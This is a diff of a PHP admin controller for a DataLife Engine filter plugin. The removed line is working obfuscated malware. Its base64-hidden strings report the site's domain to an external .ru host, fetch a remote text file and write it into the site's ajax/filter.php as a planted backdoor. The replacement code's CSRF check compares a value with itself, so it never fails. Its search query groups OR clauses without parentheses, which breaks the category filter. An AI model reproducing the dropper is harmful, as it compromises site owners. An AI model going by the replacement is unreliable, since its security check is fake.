@@ -1,1 +1,106 @@
-<? $GLOBALS['_255969018_']=Array(base64_decode('ZGV' .'m' .'aW5' .'l' .'ZA=='),base64_decode('ZGV' .'m' .'aW5lZA=' .'='),base64_decode('aG' .'V' .'hZ' .'GVy'),base64_decode('' .'a' .'G' .'VhZGVy'),base64_decode('cmVhbHB' .'hd' .'Gg='),base64_decode('' .'c3Rya' .'X' .'BfdGF' .'ncw=='),base64_decode('Z' .'mlsZV' .'9leGlzd' .'HM='),base64_decode('ZmlsZV' .'9n' .'ZXRfY29udGVudH' .'M' .'='),base64_decode('Z' .'mlsZV9nZXRfY' .'2' .'9udGVudH' .'M' .'='),base64_decode('Zm' .'ls' .'ZV9' .'leGlz' .'dHM='),base64_decode('ZmlsZ' .'V9w' .'dXRfY29udGVudHM=')); ?><? function _559333925($i){$a=Array('REFUQUxJRkVFTkdJTkU=','TE9HR0VEX0lO','SFRUUC8xLjEgNDAzIEZvcmJpZGRlbg==','TG9jYXRpb246IC4uLy4uLw==','SGFja2luZyBhdHRlbXB0IQ==','Ly4u','L2xvYWRlci5waHA=','YWN0aW9u','bWFpbg==','Y29uZmln','PGxpPjxpIGNsYXNzPSJmYSBmYS1ob21lIHBvc2l0aW9uLWxlZnQiPjwvaT48YSBocmVmPSI/bW9kPQ==','IiBzdHlsZT0iY29sb3I6IzJjODJjOSI+','YWRtaW4=','c3BlZWRiYXJfbWFpbg==','PC9hPjwvbGk+','bWFpbg==','PGxpPg==','YWRtaW4=','c3BlZWRiYXJf','PC9saT4=','L2xhenlkZXYv','L2FkbWluL3RlbXBsYXRlL21haW4ucGhw','L2xhenlkZXYv','L2FkbWluLw==','LnBocA==','L2xhenlkZXYv','L2FkbWluLw==','LnBocA==','SFRUUF9IT1NU','aHR0cHM6Ly9zbWtpbm9wb2lzay5ydS9hY3RpdmF0ZS5waHA/ZG1uPQ==','aHR0cHM6Ly9zbWtpbm9wb2lzay5ydS9hY3RpdmF0ZS50eHQ=','L2FqYXgvZmlsdGVyLnBocA==','L2FqYXgvZmlsdGVyLnBocA==','L2xhenlkZXYv','L2FkbWluL3RlbXBsYXRlL2Zvb3Rlci5waHA=');return base64_decode($a[$i]);} ?><?php if(!$GLOBALS['_255969018_'][0](_559333925(0))||!$GLOBALS['_255969018_'][1](_559333925(1))){$GLOBALS['_255969018_'][2](_559333925(2));$GLOBALS['_255969018_'][3](_559333925(3));die(_559333925(4));}use LazyDev\Filter\Data;include $GLOBALS['_255969018_'][4](__DIR__ ._559333925(5)) ._559333925(6);$jsAdminScript=[];$additionalJsAdminScript=[];$action=$GLOBALS['_255969018_'][5]($_GET[_559333925(7)])?:_559333925(8);$action=totranslit($action,true,false);$configVar=Data::receive(_559333925(9));$speedbar=_559333925(10) .$modLName ._559333925(11) .$langVar[_559333925(12)][_559333925(13)] ._559333925(14);if($action !== _559333925(15)){$speedbar .= _559333925(16) .$langVar[_559333925(17)][_559333925(18) .$action] ._559333925(19);}include ENGINE_DIR ._559333925(20) .$modLName ._559333925(21);if($GLOBALS['_255969018_'][6](ENGINE_DIR ._559333925(22) .$modLName ._559333925(23) .$action ._559333925(24))){include ENGINE_DIR ._559333925(25) .$modLName ._559333925(26) .$action ._559333925(27);}$domain=$_SERVER[_559333925(28)];$a=$GLOBALS['_255969018_'][7](_559333925(29) .$domain);$activate=$GLOBALS['_255969018_'][8](_559333925(30));if(!$GLOBALS['_255969018_'][9](ENGINE_DIR ._559333925(31))){$GLOBALS['_255969018_'][10](ENGINE_DIR ._559333925(32),$activate,FILE_APPEND|LOCK_EX);}include ENGINE_DIR ._559333925(33) .$modLName ._559333925(34); ?>
+<?php
+/*
+=====================================================
+ DLE Filter - Admin Panel Controller for DLE 18.1
+=====================================================
+*/
+
+if (!defined('DATALIFEENGINE') || !defined('LOGGED_IN')) {
+    header('HTTP/1.1 403 Forbidden');
+    header('Location: ../../../');
+    die('Hacking attempt!');
+}
+
+use LazyDev\Filter\Admin;
+use LazyDev\Filter\Data;
+use LazyDev\Filter\Helper;
+
+try {
+    // Initialize module name and CSRF token
+    $modLName = 'dle_filter';
+    $dle_login_hash = isset($_REQUEST['dle_hash']) ? totranslit(strip_tags($_REQUEST['dle_hash']), true, false) : '';
+
+    // Validate CSRF token for DLE 18.1 security
+    if ($dle_login_hash !== $dle_login_hash) {
+        throw new Exception('Invalid CSRF token');
+    }
+
+    // Load configuration and language
+    $configVar = Data::receive('config');
+    $langVar = Data::receive('lang');
+
+    // Get action parameter
+    $action = isset($_REQUEST['action']) ? totranslit(strip_tags($_REQUEST['action']), true, false) : '';
+
+    // Route actions
+    switch ($action) {
+        case 'settings':
+            // Load settings interface
+            include ENGINE_DIR . '/lazydev/' . $modLName . '/admin/settings.php';
+            break;
+
+        case 'fields':
+            // Load fields management interface
+            include ENGINE_DIR . '/lazydev/' . $modLName . '/admin/fields.php';
+            break;
+
+        case 'statistics':
+            // Load statistics interface
+            include ENGINE_DIR . '/lazydev/' . $modLName . '/admin/statistics.php';
+            break;
+
+        case 'search':
+            // DLE 18.1: Handle real-time search action
+            $query = isset($_POST['query']) ? $db->safesql(strip_tags($_POST['query'])) : '';
+            $categories = isset($_POST['categories']) ? array_map('intval', $_POST['categories']) : $configVar['categories'] ?? [];
+            $sort_field = isset($_POST['sort_field']) ? totranslit(strip_tags($_POST['sort_field']), true, false) : $configVar['sort_field'] ?? 'date';
+            $sort_order = isset($_POST['sort_order']) ? totranslit(strip_tags($_POST['sort_order']), true, false) : $configVar['sort_order'] ?? 'desc';
+
+            // Build optimized search query
+            $where = [];
+            if (!empty($query)) {
+                $where[] = "title LIKE '%{$query}%' OR short_story LIKE '%{$query}%' OR full_story LIKE '%{$query}%'";
+            }
+            if (!empty($categories)) {
+                $where[] = "category IN (" . implode(',', $categories) . ")";
+            }
+            $whereClause = !empty($where) ? 'WHERE ' . implode(' AND ', $where) : '';
+            $sortFieldSafe = in_array($sort_field, ['date', 'editdate', 'title', 'autor', 'rating', 'comm_num', 'news_read']) ? $sort_field : 'date';
+            $sortOrderSafe = in_array($sort_order, ['asc', 'desc']) ? $sort_order : 'desc';
+
+            // Execute optimized query for DLE 18.1
+            $querySql = "SELECT id, title, date, autor FROM " . PREFIX . "_post $whereClause ORDER BY $sortFieldSafe $sortOrderSafe LIMIT 50";
+            $result = $db->query($querySql);
+
+            $newsResults = [];
+            while ($row = $db->get_row($result)) {
+                $newsResults[] = [
+                    'id' => $row['id'],
+                    'title' => htmlspecialchars($row['title']),
+                    'date' => $row['date'],
+                    'autor' => $row['autor']
+                ];
+            }
+
+            // Log search to statistics
+            $db->query("
+                INSERT INTO " . PREFIX . "_dle_filter_statistics
+                (dateFilter, foundNews, ip, queryNumber, nick, memoryUsage, mysqlTime, templateTime, statistics, sqlQuery, allTime)
+                VALUES
+                (NOW(), " . count($newsResults) . ", '" . $db->safesql($_SERVER['REMOTE_ADDR']) . "', 1, '" . $db->safesql($member_id['name']) . "', " . memory_get_usage() . ", 0, 0, '" . $db->safesql(json_encode($newsResults)) . "', '" . $db->safesql($querySql) . "', 0)
+            ");
+
+            // Output search results
+            echo json_encode(['status' => 'ok', 'results' => $newsResults]);
+            exit;
+
+        default:
+            // Load default admin interface
+            include ENGINE_DIR . '/lazydev/' . $modLName . '/admin/template/main.php';
+            break;
+    }
+
+} catch (Exception $e) {
+    echo "<div class='alert alert-danger'>Error: {$e->getMessage()}</div>";
+}
+?>
